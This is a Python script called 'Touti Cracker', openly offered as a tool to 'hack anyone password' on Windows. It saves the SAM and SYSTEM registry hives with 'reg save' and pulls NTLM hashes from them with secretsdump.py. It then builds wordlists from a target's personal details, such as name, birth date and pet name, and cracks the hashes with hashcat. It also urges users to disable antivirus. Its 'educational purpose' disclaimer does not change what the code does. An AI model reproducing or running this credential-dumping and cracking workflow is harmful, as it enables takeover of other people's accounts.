import secrets
import pyfiglet
import os
import requests
import subprocess
from colorama import init, Fore, Back, Style
init()

try:


    info = Fore.BLUE + "[Info:]" + Style.RESET_ALL
    warning = Fore.MAGENTA + "[Warning:]" + Style.RESET_ALL
    disclamer = Fore.YELLOW + "[Disclamer:]" + Style.RESET_ALL
    error = Fore.RED + "[Error:]" + Style.RESET_ALL
    inpute = Fore.GREEN + "[Input:]" + Style.RESET_ALL
    
    gui = Fore.LIGHTRED_EX + pyfiglet.figlet_format("Touti Cracker", font="slant") + Style.RESET_ALL
    print(gui)
    the_link="https://github.com/Touti-Sudo"
    infos=print(info + "Welcome to Touti cracker and thank you for choosing my hacking tool if you want more informations about my tool you can check my README.txt you can also check my Github account:" + the_link + "\nThis tool will allow you to hack anyone password.")
    infos= print(warning+"This is for educationnal purpose only , i am not responsible for any bad and suspicious activities.Thank you for counsidring my words !!")
    infos=print(disclamer+"This version is now just compatible for windows only but new updates will make it cross platform check my github account for more details!  " + the_link)
    user=input( inpute + "what is the name of the local account that you are using on your computer ? : ")

    pythonversioncommand=subprocess.run("python --version",shell=True,capture_output=True,text=True)
    versionpy=list(pythonversioncommand.stdout)
    versionpy.remove(" ")
    versionpy.remove(".")
    del versionpy [10]
    versionpy.remove(".")
    versionpy.remove("\n")
    versionpy="".join(versionpy)
    print(info+"you are runing on " + versionpy)

    chemin_fichier_de_hashcat = "C:\\Users\\" + user + "\\hashcat"
    hashcatpath = chemin_fichier_de_hashcat + "\\hashcat-6.2.6.7z"
    url = r"https://hashcat.net/files/hashcat-6.2.6.7z"
    if not os.path.exists(hashcatpath):
        print(info+"Downloading Hashcat...")
        response = requests.get(url, stream=True)
        if response.status_code == 200:
            os.makedirs(chemin_fichier_de_hashcat, exist_ok=True)
            with open(hashcatpath, "wb") as file:
                for chunk in response.iter_content(chunk_size=8192):
                        file.write(chunk)
            print(info+"Hashcat downloaded successfully.")
        else:
            print(error+"Failed to download Hashcat.")
            exit()
    def sauvegarder_registres():
        chemin_backup = "C:\\Users\\"+user+"\\Desktop\\Backup"
        registres=input(inpute+"do you have the registers SAM.save and SYSTEM.save of the target if so put them in " +chemin_backup+ " to start bruteforce if you are using the programe just for a demo then you can extract the registers from your computer (y/n): ")


        if registres.lower() == "n":
            print(info+"Saving Registry keys...")
            chemin_system_save = os.path.join(chemin_backup, "system.save")
            chemin_sam_save = os.path.join(chemin_backup, "sam.save")

   
            os.makedirs(chemin_backup, exist_ok=True)

   
            if os.path.exists(chemin_system_save) and os.path.exists(chemin_sam_save):
                print(info+"Registry keys already saved. Skipping registry saving...")
                return


            commande_system = f'reg save HKLM\\system "{chemin_system_save}"'
            commande_sam = f'reg save HKLM\\sam "{chemin_sam_save}"'

            result_system = subprocess.run(commande_system, shell=True, capture_output=True, text=True)
            if result_system.returncode == 0:
                print(info+"System registry key saved successfully.")
            else:
                print(error+f"{result_system.stderr}\nError saving system registry key , high privilege may be required so please restart Touti Cracker at admin mod")
                exit()

            result_sam = subprocess.run(commande_sam, shell=True, capture_output=True, text=True)
            if result_sam.returncode == 0:
                print(info+"SAM registry key saved successfully.")
            else:
                print(error+f"{result_sam.stderr}\nError saving SAM registry key , high privilege may be required so please restart Touti Cracker at admin mod")
                exit()
        if registres.lower() == "y":
            print("thank you!!")
    

    def cracker():
        request = input(inpute+"Do you want to crack a password using that wordlist? (y/n): ").strip().lower()
        if request != "y":
            return

        chemin_fichier = "C:\\Users\\" + user + "\\Desktop\\Touti_Cracker\\mot_de_passe_bf.txt"
        systemtype = input(inpute+"On which system are you? (e.g., Windows 11, Windows 10 , Mac Os, Linux distro....): ").strip().lower()
        def remove_spaces(text):
            return text.replace(" ", "")
        systemtype_no_spaces = remove_spaces(systemtype)

        if systemtype_no_spaces == "windows11":
            chemin_extraction = chemin_fichier_de_hashcat + "\\extracted"

            os.makedirs(chemin_fichier_de_hashcat, exist_ok=True)

            if not os.path.exists(chemin_extraction):
                os.makedirs(chemin_extraction, exist_ok=True)
                command = f'"C:\\Program Files\\7-Zip\\7z.exe" x "{hashcatpath}" -o"{chemin_extraction}" -y'
                print(info+"Unzipping Hashcat...")
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    print(info+"Hashcat unzipped successfully.")
                else:
                    print(error+f"Error unzipping Hashcat: {result.stderr}")
                    print (warning+"you may need to verify that you have 7-zip installed")
                    return

            sauvegarder_registres()


            print(info+"Extracting hashes from system and SAM files...")
            command_for_extracth = (
                f'py C:\\Users\\{user}\\AppData\\Local\\Programs\\Python\\{versionpy}\\Scripts\\secretsdump.py '
                f'-sam C:\\Users\\{user}\\Desktop\\Backup\\sam.save '
                f'-system C:\\Users\\{user}\\Desktop\\Backup\\system.save LOCAL'
            )
            resultextract = subprocess.run(command_for_extracth, shell=True, capture_output=True, text=True)
            print(info+"These are the results:\n" + resultextract.stdout)

            yourhash = input(inpute+"Please write the hash that you want to crack (from the results): ")

            chemin_extraction2 = chemin_extraction + "\\hashcat-6.2.6\\hashcat.exe"
            os.chdir(os.path.dirname(chemin_extraction2)) 
            print(info+"Launching Hashcat...")

            command_lunch_hashcat = f'"{chemin_extraction2}" -m 1000 "{yourhash}" "{chemin_fichier}"'
            command_lunch_hashcats = subprocess.run(command_lunch_hashcat, shell=True, capture_output=True, text=True)
            print(command_lunch_hashcats.stdout)
            if command_lunch_hashcats.stderr:
                print(error+"\n=== Hashcat Errors ===")
                print(command_lunch_hashcats.stderr)


        if systemtype_no_spaces == "windows10":
            chemin_extraction = chemin_fichier_de_hashcat + "\\extracted"

            os.makedirs(chemin_fichier_de_hashcat, exist_ok=True)

            if not os.path.exists(chemin_extraction):
                os.makedirs(chemin_extraction, exist_ok=True)
                command = f'"C:\\Program Files\\7-Zip\\7z.exe" x "{hashcatpath}" -o"{chemin_extraction}" -y'
                print(info+"Unzipping Hashcat...")
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    print(info+"Hashcat unzipped successfully.")
                else:
                    print(error+f"Error unzipping Hashcat: {result.stderr}")
                    print (warning+"you may need to verify that you have 7-zip installed")
                    return

            sauvegarder_registres()


            print(info+"Extracting hashes from system and SAM files...")
            command_for_extracth = (
                f'py C:\\Users\\{user}\\AppData\\Local\\Programs\\Python\\{versionpy}\\Scripts\\secretsdump.py '
                f'-sam C:\\Users\\{user}\\Desktop\\Backup\\sam.save '
                f'-system C:\\Users\\{user}\\Desktop\\Backup\\system.save LOCAL'
            )
            resultextract = subprocess.run(command_for_extracth, shell=True, capture_output=True, text=True)
            print(info+"These are the results:\n" + resultextract.stdout)

            yourhash = input(inpute+"Please write the hash that you want to crack (from the results): ")

            chemin_extraction2 = chemin_extraction + "\\hashcat-6.2.6\\hashcat.exe"
            os.chdir(os.path.dirname(chemin_extraction2)) 
            print(info+"Launching Hashcat...")

            command_lunch_hashcat = f'"{chemin_extraction2}" -m 1000 "{yourhash}" "{chemin_fichier}"'
            command_lunch_hashcats = subprocess.run(command_lunch_hashcat, shell=True, capture_output=True, text=True)
            print(command_lunch_hashcats.stdout)
            if command_lunch_hashcats.stderr:
                print(error+"\n=== Hashcat Errors ===")
                print(command_lunch_hashcats.stderr)

        else:
            print(disclamer+"Linux and Mac are actually not compatible with the program but they will be in the future.Thank you for using my software")
            exit()

    def generer_mots_de_passe():
        chemin_fichier = "C:\\Users\\"+user+"\\Desktop\\Touti_Cracker\\mot_de_passe_bf.txt"
        number_of_generated_words = int(input(inpute+"How many passwords do you want to generate for brute force? : "))
        informations = []

        print(info+"Provide information to generate passwords (press 0 to skip):")
        Name = input(inpute+"First Name: ") or ""
        Family = input(inpute+"Family Name: ") or ""
        Nick = input(inpute+"Nick Name: ") or ""
        birth = input(inpute+"Date of birth (DD/MM/YYYY): ") or ""
        pet = input(inpute+"Pet Name: ") or ""
        country = input(inpute+"Country: ") or ""
        city = input(inpute+"City: ") or ""

        informations.extend([Name, Family, Nick, birth, pet, country, city])
        informations = [info for info in informations if info]  

        os.makedirs(os.path.dirname(chemin_fichier), exist_ok=True)

        with open(chemin_fichier, "w", encoding="utf-8") as fichier:
            print(info+"Generated Passwords:")
            for i in range(number_of_generated_words):
                longeur = secrets.choice(range(3, 16))
                mot_de_passe = ''.join(secrets.choice(informations) for _ in range(longeur))
                mot_de_passee =f"{i + 1}.{mot_de_passe}"
                mot_de_passee=mot_de_passee.split(".", 1)[-1].strip()
                print(mot_de_passee)
                fichier.write(mot_de_passee +"\n")

        print(info+f"All passwords have been saved to: {chemin_fichier}")
        cracker()



    while True:
    
        choice = input(inpute+"Do you want to specify information to generate passwords or just generate them randomly? (y/n): ").strip().lower()
        if choice == "y":
            generer_mots_de_passe()
            break
        elif choice == "n":
            chemin_fichier = "C:\\Users\\"+user+"\\Desktop\\Touti_Cracker\\mot_de_passe_bf.txt"
            chifrre = "0123456789"
            lettre = "azertyuiopmlkjhgfdsqwxcvbn"
            lettreup = lettre.upper()
            caractere_special = "}@()é&à=+-*/ç_²$ù^!;,"
            number_of_generated_words = int(input(inpute+"How many passwords do you want to generate for brute force? : "))
            liste_complete = list(lettre + chifrre + lettreup + caractere_special)
            dossier = os.path.dirname(chemin_fichier)
            if not os.path.exists(dossier):
                os.makedirs(dossier)

            with open(chemin_fichier, "w", encoding="utf-8") as fichier:
                print(info+"Generated Passwords:")
                for i in range(number_of_generated_words):
                    longeur =secrets.choice(range(3, 17)) 
                    mot_de_passe = ''.join(secrets.choice(liste_complete,) for _ in range(longeur))
                    mot_de_passee = f"{i + 1}. {mot_de_passe}"
                    mot_de_passee=mot_de_passee.split(".",1)[-1].strip()
                    print(mot_de_passee)
                    fichier.write(mot_de_passee + "\n")

            print(warning+f"All passwords have been saved to: {chemin_fichier}")
            cracker()
            break
        else:
            print(error+"Please enter a valid choice (y/n).")
except KeyboardInterrupt:
    print(error+"Program interrupted. Exiting...")
    exit()
except ValueError as e:
    print(error+f" {e}")
    exit()
except PermissionError :
    print(error+"Please run Touti Cracker at admin mod! and disable antivirus software")
    exit()
except FileNotFoundError :
    print(error+"The file was not found. Try reinstalling Touti Cracker and 7-Zip, and check the information you provided to us, including the capitalization of your username if there is.")
    exit()
except OSError : 
    print(error + "Please check your system compatibility and the information given to us !")
